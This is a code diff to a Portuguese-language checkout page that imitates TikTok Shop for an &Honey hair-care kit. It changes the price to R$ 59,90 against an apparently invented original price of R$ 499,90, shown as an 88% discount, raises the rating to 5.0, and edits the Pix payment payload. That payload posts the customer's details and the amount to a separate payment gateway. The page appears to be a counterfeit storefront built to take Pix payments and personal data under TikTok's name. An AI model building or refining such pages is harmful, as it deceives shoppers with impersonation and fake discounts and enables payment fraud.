@@ -215,19 +215,20 @@
                 </div>
 
                 <div class="product-card">
-                    <div class="prod-img" style="background-image: url('assets/product-1.jpg'); background-size: cover; background-position: center; border: 1px solid #ddd; background-color: transparent;"></div>
+                    <div class="prod-img" style="background-image: url('assets/product-1.webp'); background-size: cover; background-position: center; border: 1px solid #ddd; background-color: transparent;"></div>
                     <div class="prod-info">
                         <div class="prod-title">
-                            <span class="rating-badge" style="vertical-align:text-bottom;"><i class="fa-solid fa-star"></i> 4.4</span> 
-                            &honey - Deep Moist Treatment (...
+                            <span class="rating-badge" style="vertical-align:text-bottom;"><i class="fa-solid fa-star"></i> 5.0</span> 
+                            &Honey | Milky Precious Ex Repair - Kit Completo Com 4 Itens
+                        </div>
                         </div>
                         <div class="prod-shield"><i class="fa-solid fa-shield"></i> Devolução gratuita</div>
                         <div class="price-qty-row">
                             <div class="price-col">
-                                <span class="p-main">R$ 124,40 <i class="fa-solid fa-ticket" style="font-size:12px; margin-left:2px;"></i></span>
+                                <span class="p-main">R$ 59,90</span>
                                 <div class="p-old-row">
-                                    <strike>R$ 139,90</strike>
-                                    <span class="p-off">-11%</span>
+                                    <strike>R$ 499,90</strike>
+                                    <span class="p-off">-88%</span>
                                 </div>
                             </div>
                             <div class="qty-selector">
@@ -257,12 +258,12 @@
 
             <section class="summary-block">
                 <div class="sum-title">Resumo do pedido</div>
-                <div class="sum-row"><span>Subtotal do produto <i class="fa-solid fa-chevron-up" style="font-size:10px; margin-left:4px;"></i></span><span>R$ 124,40</span></div>
-                <div class="sum-row sub"><span>Preço original</span><span>R$ 139,90</span></div>
+                <div class="sum-row"><span>Subtotal do produto <i class="fa-solid fa-chevron-up" style="font-size:10px; margin-left:4px;"></i></span><span>R$ 59,90</span></div>
+                <div class="sum-row sub"><span>Preço original</span><span>R$ 499,90</span></div>
                 <div class="sum-row"><span>Taxa de envio</span><span>R$ 21,99</span></div>
                 <div class="sum-row"><span>Desconto de envio</span><span class="color-teal">- R$ 21,99</span></div>
-                <div class="savings-alert"><i class="fa-regular fa-face-laugh-beam"></i> Você está economizando R$ 37,49 nesse pedido.</div>
-                <div class="sum-row bold"><span>Total</span><span>R$ 124,40</span></div>
+                <div class="savings-alert"><i class="fa-regular fa-face-laugh-beam"></i> Você está economizando R$ 440,00 nesse pedido.</div>
+                <div class="sum-row bold"><span>Total</span><span>R$ 59,90</span></div>
                 <div class="sum-subtext">Impostos inclusos</div>
             </section>
 
@@ -283,7 +284,7 @@
             <div class="terms-text">
                 Ao fazer um pedido, você concorda com <strong>Termos de uso e venda do TikTok Shop</strong> e reconhece que leu e concordou com a <strong>Política de privacidade do TikTok</strong>.
                 <div class="savings-alert" style="text-align:left; justify-content:center; background:#ffeff2; padding:8px; margin: 12px 0 0 0;">
-                    <i class="fa-regular fa-face-laugh-beam"></i> Você está economizando R$ 37,49 nesse pedido.
+                    <i class="fa-regular fa-face-laugh-beam"></i> Você está economizando R$ 440,00 nesse pedido.
                 </div>
             </div>
             
@@ -292,7 +293,7 @@
         <div class="bottom-checkout">
             <div class="ch-total-row">
                 <span class="ch-tot-label">Total (1 item)</span>
-                <span class="ch-tot-val">R$ 124,40</span>
+                <span class="ch-tot-val">R$ 59,90</span>
             </div>
             <button class="btn-checkout" id="btn-finalizar-pedido" onclick="processPurchase()">
                 <div class="spinner"></div>
@@ -473,7 +474,7 @@
 
             // Dados do formulário (Ajustados 100% conforme a documentação oficial da Bestfy)
             const payload = {
-                amount: 12440, // R$ 124,40 em centavos (124.40 * 100)
+                amount: 5990, // R$ 59,90 em centavos
                 paymentMethod: "pix",
                 customer: {
                     name: document.getElementById('ipt-nome').value,
@@ -486,8 +487,8 @@
                 },
                 items: [
                     {
-                        title: "&honey - Deep Moist Treatment",
-                        unitPrice: 12440,
+                        title: "&Honey | Milky Precious Ex Repair - Kit Completo Com 4 Itens",
+                        unitPrice: 5990,
                         quantity: 1,
                         tangible: true // CAMPO OBRIGATÓRIO SEGUNDO A DOC
                     }
@@ -509,7 +510,7 @@
                 if (response.ok && data.qrCode) {
                     // Salvar dados no localStorage para a página pix.html
                     localStorage.setItem('lastPixData', JSON.stringify(data));
-                    localStorage.setItem('lastPurchaseValue', '124,40');
+                    localStorage.setItem('lastPurchaseValue', '59,90');
                     window.location.href = 'pix.html';
                 } else {
                     alert('Erro ao gerar Pix: ' + (data.message || 'Tente novamente mais tarde.'));
